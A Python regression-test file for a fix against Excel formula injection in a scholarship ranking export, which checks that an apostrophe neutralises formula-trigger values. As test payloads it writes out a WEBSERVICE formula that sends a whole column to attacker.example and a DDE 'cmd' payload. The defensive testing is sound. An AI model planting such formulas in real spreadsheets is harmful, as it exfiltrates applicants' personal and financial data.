"""
Regression tests for stored Excel formula injection (CWE-1236, issue #1081
finding G): a student's dynamic application form field value was written
unescaped into the 學生資料彙整表 workbook that college/admin reviewers
download and open. openpyxl promotes a string starting with '=' to a live
formula cell -- e.g. a payload referencing the whole sheet could exfiltrate
every applicant's national ID / bank account / address to an attacker URL
once a reviewer opens the file.

Fix: excel_safe_cell_value (app/utils/excel_safety.py) prefixes any string
starting with a formula-trigger character with an apostrophe before it's
written to an xlsx cell, applied at every openpyxl cell-write site that
carries student- or otherwise low-privilege-influenced data. The PDF export
path is untouched (PDFs can't execute formulas, and _row_cells is shared, so
guarding only the xlsx write site keeps the PDF rendering raw text).
"""

from types import SimpleNamespace

import openpyxl
import pytest

from app.services.college_ranking_export_service import (
    CollegeRankingExportService,
    DynamicFieldSpec,
    ExportRow,
)
from app.utils.excel_safety import excel_safe_cell_value

MALICIOUS_FORMULA = '=WEBSERVICE("https://attacker.example/x?d="&TEXTJOIN(",",TRUE,A:A))'


class TestExcelSafeCellValue:
    @pytest.mark.parametrize("trigger", ["=", "+", "-", "@", "\t", "\r"])
    def test_formula_trigger_prefixes_are_neutralized(self, trigger):
        value = f"{trigger}cmd|'/c calc'!A1"
        result = excel_safe_cell_value(value)
        assert result == "'" + value
        assert result.startswith("'")

    def test_ordinary_string_passes_through_unchanged(self):
        assert excel_safe_cell_value("王小明") == "王小明"
        assert excel_safe_cell_value("a=b") == "a=b"  # '=' not in leading position

    @pytest.mark.parametrize("value", [42, 3.14, None, True])
    def test_non_string_values_pass_through_unchanged(self, value):
        assert excel_safe_cell_value(value) == value


class TestCollegeRankingExportFormulaInjection:
    @pytest.fixture
    def service(self):
        return CollegeRankingExportService()

    @pytest.fixture
    def malicious_row(self):
        app = SimpleNamespace(
            student_data={
                "std_cname": "惡意申請人",
                "std_stdcode": "310460099",
                "std_pid": "A123456789",
            },
            submitted_form_data={"fields": {"essay": {"value": MALICIOUS_FORMULA}}},
            sub_type_preferences=["nstc"],
            sub_scholarship_type=None,
        )
        return ExportRow(rank_position=1, application=app, bank_account="0001234567")

    @pytest.fixture
    def dynamic_fields(self):
        return [DynamicFieldSpec(field_name="essay", field_label="得獎理由", export_column_label=None, display_order=1)]

    def test_malicious_dynamic_field_is_not_a_live_formula_in_xlsx(self, service, malicious_row, dynamic_fields):
        xlsx_bytes = service.build_workbook(
            rows=[malicious_row],
            dynamic_fields=dynamic_fields,
            sub_type_labels={"nstc": "國科會"},
            title="Test Export",
            sheet_name="Sheet1",
        )

        import io

        wb = openpyxl.load_workbook(io.BytesIO(xlsx_bytes))
        ws = wb.active

        essay_col = len(service._headers(dynamic_fields))  # essay is the last (only) dynamic column
        cell = ws.cell(row=3, column=essay_col)  # row 3 = first data row (1=title, 2=header)

        # The defining check: openpyxl must NOT classify this as a formula cell.
        assert cell.data_type != "f"
        # The value is preserved as literal text (apostrophe-prefixed), not silently dropped.
        assert cell.value == "'" + MALICIOUS_FORMULA

    def test_pdf_export_still_renders_malicious_row_without_error(self, service, malicious_row, dynamic_fields):
        # PDFs can't execute formulas -- this just confirms the fix didn't break
        # the shared _row_cells path the PDF renderer also uses.
        pdf_bytes = service.build_pdf(
            rows=[malicious_row],
            dynamic_fields=dynamic_fields,
            sub_type_labels={"nstc": "國科會"},
            title="Test Export",
        )
        assert pdf_bytes.startswith(b"%PDF")
